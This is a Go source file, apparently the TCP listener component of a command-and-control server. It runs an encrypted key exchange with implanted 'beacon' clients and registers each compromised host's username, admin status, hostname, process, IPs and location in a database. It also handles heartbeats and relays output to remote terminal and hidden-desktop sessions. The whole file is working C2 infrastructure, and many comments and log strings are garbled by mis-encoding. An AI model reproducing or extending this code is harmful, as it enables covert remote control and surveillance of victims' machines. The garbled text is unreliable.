package tcp

import (
	"BackendTemplate/pkg/command"
	"BackendTemplate/pkg/connection"
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/encrypt"
	"BackendTemplate/pkg/notification"
	"BackendTemplate/pkg/qqwry"
	"BackendTemplate/pkg/utils"
	"BackendTemplate/pkg/utils/logx"
	"bufio"
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

// XTerm会话广播函数，由api包在初始化时设置
var BroadcastToXTermSessions func(uid string, data []byte)

// HVNC会话广播函数，由api包在初始化时设置
var BroadcastToHVNCSessions func(uid, sid string, frame []byte)

// 隧道管理器注册回调函数，由main.go在初始化时设置

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

var TCPClientManger = make(map[string]net.Conn)
var Mutex sync.Mutex
var TCPWriteLocks = make(map[string]*sync.Mutex)

// TCPWriters per-UID bufio.Writer 缓存（P1-4: 避免每次发送命令新建 writer 的分配/GC 压力）
// 由写锁 GetWriteLock 串行访问，无需单独加锁；ReleaseWriteLock 时一并清理。
type tcpWriterEntry struct {
	conn   net.Conn
	writer *bufio.Writer
}

var TCPWriters = make(map[string]*tcpWriterEntry)

// GetWriteLock 获取指定UID的写锁（每个连接独立写互斥，防止并发写帧交错）
func GetWriteLock(uid string) *sync.Mutex {
	Mutex.Lock()
	defer Mutex.Unlock()
	if TCPWriteLocks[uid] == nil {
		TCPWriteLocks[uid] = &sync.Mutex{}
	}
	return TCPWriteLocks[uid]
}

// GetWriteBuffer 获取指定UID的带缓冲 writer（连接变化时重建，防止写入旧连接）
// 必须在持有 GetWriteLock(uid) 的情况下调用。
func GetWriteBuffer(uid string, conn net.Conn) *bufio.Writer {
	Mutex.Lock()
	defer Mutex.Unlock()
	entry := TCPWriters[uid]
	if entry != nil && entry.conn == conn {
		return entry.writer
	}
	// 连接对象变化（重连）或首次使用：重建 writer 并绑定当前连接
	w := bufio.NewWriter(conn)
	TCPWriters[uid] = &tcpWriterEntry{conn: conn, writer: w}
	return w
}

// ReleaseWriteLock 删除指定UID的写锁（断连/清理时调用，防止 map 只增不减）
func ReleaseWriteLock(uid string) {
	Mutex.Lock()
	defer Mutex.Unlock()
	delete(TCPWriteLocks, uid)
	delete(TCPWriters, uid)
}

type ClientTime struct {
	LastHeartbeat time.Time
	TimeoutCount  int
}

var ClientTimeManager = make(map[string]*ClientTime)

// gbkToUtf8 将GBK缂栫爜杞崲涓篣TF-8 (已迁移到utils.ProcessShellOutput)
func gbkToUtf8(data []byte) ([]byte, error) {
	// 浣跨敤鏂扮殑缁熶竴缂栫爜澶勭悊鍣?
	return utils.ProcessShellOutput(data)
}

// HandleTcpConnection 反向 TCP 客户端连接处理（监听器 Accept 得到）
func HandleTcpConnection(conn net.Conn) {
	HandleTcpConnectionForWithKeys(conn, "tcp", nil, nil)
}

// HandleTcpConnectionFor 按监听器类型处理 TCP 连接（反向 tcp / 正向 tcp_forward 共用）
func HandleTcpConnectionFor(conn net.Conn, listenerType string) {
	HandleTcpConnectionForWithKeys(conn, listenerType, nil, nil)
}

// MsgTypeKX 会话前 ECDH 密钥交换帧类型（沿用 len(4)|msgType(4)|payload 分帧，
// payload = base64(公钥)）。取值 200 是确认过未被占用（1=firstBlood 2=otherMsg 3=heartBeat）。
//
// 为什么用新 msgType 而不是在流前面加一段裸头：分帧已经存在，加一个类型
// 把改动限制在两端各自的分发 switch 里，不必动连接建立与读取循环。
const MsgTypeKX = 200

// connKXState 连接级 ECDH 状态。
//
// 必须是**连接级**而不是全局缓存：TCP 是一条长连接上的连续帧，
// 派生结果只对这一条连接有意义。用 map 按连接记反而要多管生命周期与清理。
type connKXState struct {
	masterKey []byte
}

// resolveMetaKey 决定本次连接用哪把主密钥与哪份盐。
//
// 优先级（顺序即语义，改动会直接影响互通性）：
//  1. **KX 派生密钥**最高：交换一旦完成，整条连接都必须用它，
//     否则 MetaInfo 解密与会话密钥派生会各用一套密钥
//  2. 然后是显式覆盖（正向连接由服务端拨号方传入）
//  3. 最后是监听器配置
//
// 注意覆盖时**盐也要跟着覆盖** —— 这一点曾经写错：只覆盖主密钥、盐仍取监听器配置，
// 结果两端用不同的盐派生，算出不同密钥，现场只看到"解密失败"，极难定位。
func resolveMetaKey(listenerType string, masterKeyOverride, saltOverride []byte, kx *connKXState) ([]byte, []byte) {
	if kx != nil && len(kx.masterKey) >= encrypt.ECDHSharedKeySize {
		_, salt := encrypt.GetListenerKeyConfigForForward(listenerType)
		if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
			_, salt = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
		}
		return kx.masterKey, salt
	}
	mk, salt := encrypt.GetListenerKeyConfigForForward(listenerType)
	if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
		mk, salt = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
	}
	return mk, salt
}

// handleKXFrame 处理一个 KX 帧：解析客户端公钥 → 派生主密钥 → 回服务端公钥。
//
// 与 HTTP 家族同样的取舍：公钥是公开信息，无需加密传输；
// 交换失败返回错误（调用方断开连接），**不**静默退回静态密钥。
func handleKXFrame(conn net.Conn, payload []byte, salt []byte, st *connKXState) error {
	peerPub, err := encrypt.ParsePeerPublicKey(strings.TrimSpace(string(payload)))
	if err != nil {
		return fmt.Errorf("KX 客户端公钥不可用: %w", err)
	}
	srv, err := encrypt.NewServerKeyExchange()
	if err != nil {
		return err
	}
	mk, err := srv.DeriveMasterKey(peerPub, salt)
	if err != nil {
		return fmt.Errorf("KX 派生失败: %w", err)
	}
	if st != nil {
		st.masterKey = mk
	}
	// 回帧：len(4)|MsgTypeKX(4)|b64(serverPub)
	body := []byte(srv.HeaderValue())
	frame := make([]byte, 8+len(body))
	binary.BigEndian.PutUint32(frame[0:4], uint32(4+len(body)))
	binary.BigEndian.PutUint32(frame[4:8], MsgTypeKX)
	copy(frame[8:], body)
	if _, err := conn.Write(frame); err != nil {
		return fmt.Errorf("KX 回帧失败: %w", err)
	}
	logx.Infof("🔑 [TCP-KX] 完成会话前密钥交换，后续帧使用派生主密钥\n")
	return nil
}

// HandleTcpConnectionForWithKeys 支持显式会话密钥覆盖（正向连接自定义密钥时使用；nil 则用 GetListenerKeyConfig）
func HandleTcpConnectionForWithKeys(conn net.Conn, listenerType string, masterKeyOverride, saltOverride []byte) {
	// 崩溃防护：任何 panic 都记录并关闭连接，不让异常扩散到整个进程
	defer func() {
		if r := recover(); r != nil {
			logx.Infof("鉂?[TCP-RECOVER] 连接处理panic宸叉崟鑾? %v (listener=%s, remote=%s)\n", r, listenerType, conn.RemoteAddr().String())
		}
	}()

	// 设置连接超时
	if connection.GlobalConnectionManager != nil {
		connection.GlobalConnectionManager.SetConnectionTimeout(conn)
	}

	reader := bufio.NewReader(conn)
	connectionID := fmt.Sprintf("%s_%d", listenerType, time.Now().UnixNano())
	clientIP := conn.RemoteAddr().String()

	// 璁板綍瀹㈡埛绔疷ID锛岀敤浜庤繛鎺ユ柇寮€鏃舵竻鐞?
	var currentUID string

	// 延迟清理连接 - 与TCP/WebSocket保持一致的完整清理机制
	defer func() {
		if currentUID != "" {
			logx.Infof("🔌 [TCP鏂紑] 瀹㈡埛绔嬭繛鎺ユ柇寮€锛屾竻鐞嗙姸鎬? %s\n", currentUID)

			// 【振荡修复】仅当映射仍指向本连接时才删除：客户端重连后
			// TCPClientManger[uid] 已指向新连接，旧连接 defer 清理误删新连接映射
			Mutex.Lock()
			if cur, ok := TCPClientManger[currentUID]; ok && cur == conn {
				delete(TCPClientManger, currentUID)
			}
			delete(ClientTimeManager, currentUID)
			Mutex.Unlock()
			// 清理写锁条目（防止 map 只增不减）
			ReleaseWriteLock(currentUID)
			// 清理全部内存队列并广播离线信号（等待中的 handler 提前返回）
			command.CleanupClientQueues(currentUID)

			// 统一离线检测器注销（仅当仍登记本 UID 时注销，防新连接被旧连接注销）
			if connection.GlobalOfflineDetector != nil && connection.GlobalOfflineDetector.IsRegistered(currentUID) {
				connection.GlobalOfflineDetector.Unregister(currentUID)
			}

			connection.MuClientListenerType.Lock()
			if lt, ok := connection.ClientListenerType[currentUID]; ok && lt == listenerType {
				delete(connection.ClientListenerType, currentUID)
				delete(connection.ClientListenerAddr, currentUID)
			}
			connection.MuClientListenerType.Unlock()

			// 在数据库中标记为离线
			// LogUpdate 统一记结果日志；不用 MarkOffline——其无条件删 ClientListenerType 会破坏上方振荡修复守卫的语义
			affected, err := database.DB().Where("uid = ?", currentUID).Update(&database.Clients{Online: "2"})
			database.LogUpdate(affected, err, "TCP断连置离线 uid="+currentUID)

			// 实时事件：连接断开也要发布离线事件（原仅超时判离线时发布）
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOffline, currentUID, map[string]interface{}{
					"listener": listenerType,
					"reason":   "connection_closed",
				})
			}
			logx.Infof("鉁?[TCP鏂紑] 瀹㈡埛绔姸鎬佸凡娓呯悊: %s\n", currentUID)
		}
		conn.Close()
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RemoveConnection(connectionID)
		}
	}()

	// 连接保活设置 - 专门为本地环境优化
	if tcpConn, ok := conn.(*net.TCPConn); ok {
		tcpConn.SetKeepAlive(true)
		tcpConn.SetKeepAlivePeriod(15 * time.Second) // 更频繁的保活检查

		// 设置读写缓冲区 - 增加缓冲区大小
		tcpConn.SetReadBuffer(65536)  // 64KB
		tcpConn.SetWriteBuffer(65536) // 64KB

		// 禁用Nagle算法，提高实时性
		tcpConn.SetNoDelay(true)

		// 设置初始写入超时
		conn.SetWriteDeadline(time.Now().Add(30 * time.Second))

		logx.Infof("🌐 本地TCP连接优化完成: %s\n", clientIP)
	}

	// 隧道友好的连接管理 - 更稳定的策略
	lastActivityTime := time.Now()
	// 连接级 ECDH 状态：KX 帧派生出的主密钥对后续帧生效
	kxState := &connKXState{}

	for {
		// 设置更长的读取超时，减少频繁断开
		conn.SetReadDeadline(time.Now().Add(10 * time.Minute)) // 10分钟超时
		// 写入超时保持相对较短
		conn.SetWriteDeadline(time.Now().Add(60 * time.Second))

		// 直接处理消息
		ctx := context.Background()
		uid, err := processMessage(ctx, reader, conn, connectionID, clientIP, listenerType, masterKeyOverride, saltOverride, kxState)
		if err != nil {
			// 检查是否是正常的连接关闭
			if strings.Contains(err.Error(), "use of closed network connection") ||
				strings.Contains(err.Error(), "connection reset by peer") ||
				strings.Contains(err.Error(), "EOF") ||
				strings.Contains(err.Error(), "connection was forcibly closed") {
				logx.Infof("🔌 TCP客户端连接断开: %s\n", clientIP)
				break
			} else if strings.Contains(err.Error(), "i/o timeout") {
				// 检查距离上次活动的时间
				timeSinceLastActivity := time.Since(lastActivityTime)

				// 只有在长时间无活动时才考虑断开
				if timeSinceLastActivity > 15*time.Minute {
					logx.Infof("⏰ 长时间无活动，断开连接: %s (%.1f分钟无活动)\n", clientIP, timeSinceLastActivity.Minutes())
					break
				}

				// 短期超时时，仅记录并继续等待
				logx.Infof("⏰ TCP读取超时，但连接保持: %s (距上次活动%.1f分钟)\n", clientIP, timeSinceLastActivity.Minutes())
				continue
			} else {
				// 其他类型的错误，记录后断开
				logx.Infof("❌ 处理TCP消息失败: %v\n", err)
				break
			}
		} else {
			// 成功处理消息，更新活动时间和UID
			// 成功处理消息，更新活动时间和UID
			// 鎴愬姛澶勭悊娑堟伅锛屾洿鏂版椿鍔ㄦ椂闂村拰UID
			lastActivityTime = time.Now()
			if uid != "" {
				currentUID = uid // 记录UID供defer使用
				// 缁熶竴绂荤嚎妫€测器 Touch锛堜换浣曟秷鎭兘琛ㄧず瀹㈡埛绔椿璺冿級
				if connection.GlobalOfflineDetector != nil {
					connection.GlobalOfflineDetector.Touch(uid)
				}
			}
		}
	}
}

// HandleForwardConnection 正向 TCP 客户端连接处理（服务端拨号连入目标）
func HandleForwardConnection(conn net.Conn) {
	HandleTcpConnectionFor(conn, "tcp_forward")
}
func HandleForwardConnectionWithKeys(conn net.Conn, masterKey, salt []byte) {
	HandleTcpConnectionForWithKeys(conn, "tcp_forward", masterKey, salt)
}

// processMessage 处理单个消息，返回uid浠ヤ究鍦╠efer涓竻鐞?
// sendSessionNonce 生成并下发每连接会话 nonce（type=4|nonce，初始密钥加密）
func sendSessionNonce(conn net.Conn, uid string, salt, masterKey []byte) {
	b64 := command.BuildSessionNonceMsg(uid, salt, masterKey)
	if b64 == nil {
		return
	}
	msg := utils.BytesCombine(utils.WriteInt(len(b64)), b64)
	writeLock := GetWriteLock(uid)
	writeLock.Lock()
	defer writeLock.Unlock()
	writer := bufio.NewWriter(conn)
	if _, err := writer.Write(msg); err != nil {
		logx.Warnf("⚠️ [TCP] nonce 下发失败: %s, %v\n", uid, err)
		return
	}
	writer.Flush()
	logx.Infof("🔑 [TCP] 会话密钥唯一化 nonce 已下发: %s\n", uid)
}

func processMessage(ctx context.Context, reader *bufio.Reader, conn net.Conn, connectionID, clientIP, listenerType string, masterKeyOverride, saltOverride []byte, kx *connKXState) (string, error) {
	// 监听器主密钥 + 盐（MetaInfo 解密与 KX 派生共用，优先级见 resolveMetaKey）
	metaMasterKey, metaSalt := resolveMetaKey(listenerType, masterKeyOverride, saltOverride, kx)
	// 妫€鏌ヤ笂涓嬫枃鏄惁鍙栨秷
	select {
	case <-ctx.Done():
		return "", ctx.Err()
	default:
	}

	// 读取消息长度
	var length uint32
	err := binary.Read(reader, binary.BigEndian, &length)
	if err != nil {
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RecordConnectionError(connectionID)
		}
		return "", fmt.Errorf("读取消息长度失败: %v", err)
	}

	// 闀垮害涓婇檺鏍￠獙锛岄槻姝㈡伓鎰忓鎴风鏃犵晫鍒嗛厤鍐呭瓨
	const maxMessageSize = 64 * 1024 * 1024 // 64MB
	if length > maxMessageSize {
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RecordConnectionError(connectionID)
		}
		return "", fmt.Errorf("消息长度超过上限: %d", length)
	}

	// 鏍规嵁闀垮害璇诲彇娑堟伅鍐呭
	message := make([]byte, length)
	_, err = io.ReadFull(reader, message)
	if err != nil {
		if connection.GlobalConnectionManager != nil {
			connection.GlobalConnectionManager.RecordConnectionError(connectionID)
		}
		return "", fmt.Errorf("璇诲彇娑堟伅鍐呭澶辫触: %v", err)
	}

	// 鏇存柊杩炴帴娲诲姩缁熻
	if connection.GlobalConnectionManager != nil {
		connection.GlobalConnectionManager.UpdateConnectionActivity(connectionID, int64(len(message)), 0)
	}

	// 至少需要 4 字节消息类型头，防止越界
	if len(message) < 4 {
		return "", fmt.Errorf("消息长度不足: %d", len(message))
	}
	msgTypeBytes := message[:4]
	msgType := binary.BigEndian.Uint32(msgTypeBytes)
	switch msgType {
	case MsgTypeKX: // 会话前 ECDH 交换（见 handleKXFrame）
		// 交换成功则不返回 uid，读取循环继续等 firstBlood。
		// 失败返回错误 → 上层断开连接（不降级到静态密钥）。
		if err := handleKXFrame(conn, message[4:], metaSalt, kx); err != nil {
			return "", err
		}
		return "", nil
	case 1: // firstBlood
		msg := message[4:]
		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			return "", fmt.Errorf("瑙ｇ爜base64失败: %v", err)
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
		if err != nil {
			return "", fmt.Errorf("瑙ｅ瘑澶辫触: %v", err)
		}
		// FirstBlood 鍏冩暟鎹暱搴︽牎楠岋細鑷冲皯闇€瑕?9 字节（pid4+flag1+ip4锛変笖鏈?OS 淇℃伅
		if len(metainfo) < 10 {
			return "", fmt.Errorf("FirstBlood鍏冩暟鎹暱搴︿笉瓒? %d", len(metainfo))
		}
		uid := encrypt.BytesToMD5(metainfo)

		// 绔嬪嵆涓哄鎴风鐢熸垚浼氳瘽瀵嗛挜锛堢‘淇濅笌瀹㈡埛绔悓姝ワ級
		if encrypt.GlobalKeyManager != nil {
			// 获取监听器特定的密钥配置（正向连接可显式覆盖）
			masterKey, encryptionSalt := encrypt.GetListenerKeyConfigForForward(listenerType)
			if len(masterKeyOverride) > 0 && len(saltOverride) > 0 {
				// 规范化为 32/16 字节，与客户端占位符切片规则一致
				masterKey, encryptionSalt = encrypt.NormalizeListenerKeyConfig(masterKeyOverride, saltOverride)
			}
			// J4: 拒绝公开默认密钥连接（默认密钥可解密全部 C2 流量、伪造客户端劫持会话）
			if encrypt.IsDefaultListenerKey(masterKey, encryptionSalt) {
				logx.Warnf("⚠️ [%s-FIRSTBLOOD] 监听器使用公开默认密钥，拒绝连接: %s\n", listenerType, clientIP)
				return "", fmt.Errorf("监听器默认密钥被拒绝")
			}
			_, err = encrypt.GlobalKeyManager.DeriveSessionKeyForListenerWithKeys(uid, encryptionSalt, masterKey, encryptionSalt)
			if err != nil {
				logx.Infof("⚠️ [%s-FIRSTBLOOD] 为客户端 %s 生成会话密钥失败: %v\n", listenerType, uid, err)
			} else {
				logx.Infof("🔑 [%s-FIRSTBLOOD] 为客户端 %s 成功生成会话密钥（%s监听器）\n", listenerType, uid, listenerType)
				// 【会话密钥唯一化】每连接随机 nonce 重派生，并经初始密钥下发（type=4|nonce）
				sendSessionNonce(conn, uid, encryptionSalt, masterKey)
			}
		}
		// 灏嗚繛鎺ユ坊鍔犲埌杩炴帴姹?
		if connection.GlobalConnectionManager != nil {
			err = connection.GlobalConnectionManager.AddConnection(connectionID, uid, listenerType, clientIP, conn)
			if err != nil {
				return "", fmt.Errorf("娣诲姞杩炴帴鍒拌繛鎺ユ睜澶辫触: %v", err)
			}
		}

		// 保持向后兼容
		Mutex.Lock()
		TCPClientManger[uid] = conn
		Mutex.Unlock()

		connection.MuClientListenerType.Lock()
		connection.ClientListenerType[uid] = listenerType
		// 存储客户端应回连的地址（ConnectAddress），避免 0.0.0.0 监听地址导致新 beacon 连 0.0.0.0
		if conn != nil {
			if tcpAddr, ok := conn.LocalAddr().(*net.TCPAddr); ok {
				port := strconv.Itoa(tcpAddr.Port)
				var lis database.Listener
				if has, _ := database.DB().Where("type = ? AND listen_address LIKE ?", listenerType, "%:"+port).Get(&lis); has && lis.ConnectAddress != "" {
					connection.ClientListenerAddr[uid] = lis.ConnectAddress
				} else if has, _ := database.DB().Where("type = ?", listenerType).Desc("id").Get(&lis); has && lis.ConnectAddress != "" {
					connection.ClientListenerAddr[uid] = lis.ConnectAddress
				} else {
					connection.ClientListenerAddr[uid] = net.JoinHostPort(tcpAddr.IP.String(), port)
				}
			} else {
				connection.ClientListenerAddr[uid] = conn.LocalAddr().String()
			}
		}
		connection.MuClientListenerType.Unlock()

		var client database.Clients
		exsists, _ := database.DB().Where("uid = ?", uid).Get(&client)
		if !exsists { // FirstBlood
			processID := binary.BigEndian.Uint32(metainfo[:4])
			flag := int(metainfo[4:5][0])
			ipInt := binary.LittleEndian.Uint32(metainfo[5:9])
			localIP := utils.Uint32ToIP(ipInt).String()
			osInfo := string(metainfo[9:])

			osArray := strings.Split(osInfo, "\t")
			if len(osArray) < 3 {
				return "", fmt.Errorf("FirstBlood绯荤粺淇℃伅瀛楁涓嶈冻: %d", len(osArray))
			}
			hostName := osArray[0]
			UserName := osArray[1]
			processName := osArray[2]
			clientOs := ""
			if len(osArray) >= 4 {
				clientOs = osArray[3]
			}

			// 外网 IP
			remoteAddr := conn.RemoteAddr().String()
			externalIp, _, err := net.SplitHostPort(remoteAddr)
			if err != nil {
				externalIp = remoteAddr
			}
			if externalIp == "::1" {
				externalIp = "127.0.0.1"
			}
			address, _ := qqwry.GetLocationByIP(externalIp)

			currentTime := time.Now()
			timeFormat := "2006-01-02 15:04:05"
			formattedTime := currentTime.Format(timeFormat)

			arch := "x86"

			if flag > 8 {
				UserName += "*"
				flag = flag - 8
			}
			if flag > 4 {
				arch = "x64"
			}

			// 从监听器配置中获取心跳参数
			heartbeatTimeout, heartbeatInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)

			database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, heartbeatInterval)), Online: "1", Color: "", Listener: listenerType, Os: clientOs, HeartbeatTimeout: heartbeatTimeout, HeartbeatInterval: heartbeatInterval})
			database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
			database.DB().Insert(&database.Notes{Uid: uid, Note: ""})

			// 触发客户端上线通知
			if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
				notificationManager.OnClientOnline(uid)
			}
			// B11: 发布客户端上线事件
			if command.GlobalEventBus != nil {
				command.PublishEvent(command.EventClientOnline, uid, map[string]interface{}{
					"listener":    listenerType,
					"username":    UserName,
					"computer":    hostName,
					"external_ip": externalIp,
					"internal_ip": localIP,
					"pid":         strconv.Itoa(int(processID)),
					"arch":        arch,
					"os":          clientOs,
					"process":     processName,
				})
			}

		}
		database.SetClientOnline(uid, listenerType)

		// 添加到客户端时间管理器
		clientTime := &ClientTime{
			LastHeartbeat: time.Now(),
			TimeoutCount:  0,
		}
		Mutex.Lock()
		ClientTimeManager[uid] = clientTime
		Mutex.Unlock()
		// 统一离线检测器注册（心跳间隔取监听器配置——客户端二进制 patch 的同一值；
		// 原用 client.Sleep(命令休眠,firstBlood 恒为 "1")→ 心跳间隔 ≥30s 的客户端会被误判离线）
		if connection.GlobalOfflineDetector != nil {
			_, hbInterval := database.GetListenerHeartbeatConfigByAddr(conn.LocalAddr().String(), listenerType)
			// 统一心跳：优先采用客户端上报的真实 sleep（MetaInfo 第5字段），回退监听器配置
			clientMeta := strings.Split(string(metainfo[9:]), "\t")
			sleepSec := connection.ResolveSleepSeconds(clientMeta, hbInterval)
			connection.GlobalOfflineDetector.Register(uid, listenerType, sleepSec, func() {
				Mutex.Lock()
				delete(TCPClientManger, uid)
				delete(ClientTimeManager, uid)
				Mutex.Unlock()
				// 离线判定时主动关闭实际连接，终止僵尸读循环
				if conn != nil {
					conn.Close()
				}
			})
		}

		// 返回uid供主函数记录
		return uid, nil

	case 3: // heartBeat
		msg := message[4:]
		tmpMetainfo, err := encrypt.DecodeBase64(msg)
		if err != nil {
			return "", fmt.Errorf("蹇冭烦鍖呰В鐮佸け璐? %v", err)
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
		if err != nil {
			return "", fmt.Errorf("蹇冭烦鍖呰В瀵嗗け璐? %v", err)
		}
		uid := encrypt.BytesToMD5(metainfo)

		// 【性能优化】密钥状态检查移出全局锁：GetKeyStatus/ParseDuration 为慢操作，
		// 原实现每条心跳持全局 Mutex 执行，串行化全部客户端心跳
		var keyExpiringSoon time.Duration
		if encrypt.GlobalKeyManager != nil {
			keyStatus := encrypt.GlobalKeyManager.GetKeyStatus(uid)
			if keyStatusData, ok := keyStatus["current_key"].(map[string]interface{}); ok {
				if timeToExpiry, ok := keyStatusData["time_to_expiry"].(string); ok {
					if strings.Contains(timeToExpiry, "h") {
						// 如果密钥在 4 小时内过期，发送密钥更新通知
						if duration, err := time.ParseDuration(timeToExpiry); err == nil && duration <= 4*time.Hour && duration > 0 {
							keyExpiringSoon = duration
						}
					}
				}
			}
		}

		// 锁内仅做 ClientTimeManager 更新（短临界区）
		Mutex.Lock()
		if clientTime, exists := ClientTimeManager[uid]; exists {
			clientTime.LastHeartbeat = time.Now()
			clientTime.TimeoutCount = 0
		}
		Mutex.Unlock()

		if keyExpiringSoon > 0 {
			logx.Infof("🔑 [TCP-HEARTBEAT] 密钥即将过期，准备更新: %s, 剩余时间: %v\n", uid, keyExpiringSoon)
		}

		// 回复心跳 ack：供客户端用读超时探测半开连接（服务端静默死亡时客户端能及时重连）
		ackBase64 := command.BuildHeartbeatAckBytes(uid)
		ackMsg := command.FrameHeartbeatAck(ackBase64)
		writeLock := GetWriteLock(uid)
		writeLock.Lock()
		if _, werr := conn.Write(ackMsg); werr != nil {
			logx.Warnf("⚠️ [TCP心跳ACK] 写入失败: %s, 错误: %v\n", uid, werr)
		}
		writeLock.Unlock()

		// 返回uid
		return uid, nil

	case 2: // otherMsg
		msg := message[4:]
		// 【安全】metaLen 为客户端可控值，切片前必须校验，防止恶意 metaLen 触发 panic
		if len(msg) < 4 {
			return "", fmt.Errorf("其他消息头不足: %d", len(msg))
		}
		metaLen := binary.BigEndian.Uint32(msg[:4])
		if metaLen > uint32(len(msg)-4) {
			return "", fmt.Errorf("其他消息 metaLen 越界: %d > %d", metaLen, len(msg)-4)
		}
		metaMsg := msg[4 : 4+metaLen]
		realMsg := msg[4+metaLen:]

		tmpMetainfo, err := encrypt.DecodeBase64(metaMsg)
		if err != nil {
			return "", fmt.Errorf("鍏朵粬娑堟伅瑙ｇ爜澶辫触: %v", err)
		}
		metainfo, err := encrypt.DecryptWithMasterKeyRaw(tmpMetainfo, metaMasterKey)
		if err != nil {
			return "", fmt.Errorf("鍏朵粬娑堟伅瑙ｅ瘑澶辫触: %v", err)
		}
		uid := encrypt.BytesToMD5(metainfo)

		dataBytes, _ := encrypt.DecodeBase64(realMsg)
		// 灏濊瘯浣跨敤楂樼骇浼氳瘽瀵嗛挜瑙ｅ瘑
		dataBytes, err = encrypt.DecryptWithSessionKey(dataBytes, uid)
		if err != nil {
			// 【加密体系改造】不再回落旧加密
			return "", fmt.Errorf("会话密钥解密失败: %v", err)
		} else {
			logx.Infof("🔓 [TCP] 浣跨敤楂樼骇浼氳瘽瀵嗛挜瑙ｅ瘑: %s\n", uid)
		}

		// 娣诲姞鏁版嵁闀垮害妫€鏌ワ紝闃叉 slice bounds out of range 閿欒
		if len(dataBytes) < 4 {
			logx.Infof("⚠️ 数据长度不足 - UID: %s, 数据长度: %d, 闇€瑕佽嚦灏?字节\n", uid, len(dataBytes))
			return "", fmt.Errorf("数据长度不足，无法提取消息类型，需要至少 4 字节，实际收到%d字节", len(dataBytes))
		}

		// 拆包 + 边界校验统一走 SplitReplyPayload（B4 收敛，六处手写拆包消除）
		replyType, data, err := command.SplitReplyPayload(dataBytes)
		if err != nil {
			logx.Infof("⚠️ [TCP] %v - UID: %s\n", err, uid)
			return uid, nil
		}

		// 客户端回包统一处理（TCP/KCP/WS 三协议共用，见 pkg/command/reply_handlers.go）
		if err := command.HandleClientReply(listenerType, uid, replyType, data, BroadcastToXTermSessions, BroadcastToHVNCSessions); err != nil {
			logx.Warnf("⚠️ [%s] 处理客户端回包失败 (type=%d): %v\n", listenerType, replyType, err)
		}

		// 返回uid
		return uid, nil
	}
	return "", nil
}

// 妫€鏌ュ鎴风蹇冭烦 - 浣跨敤鏅鸿兘妫€娴嬬畻娉?
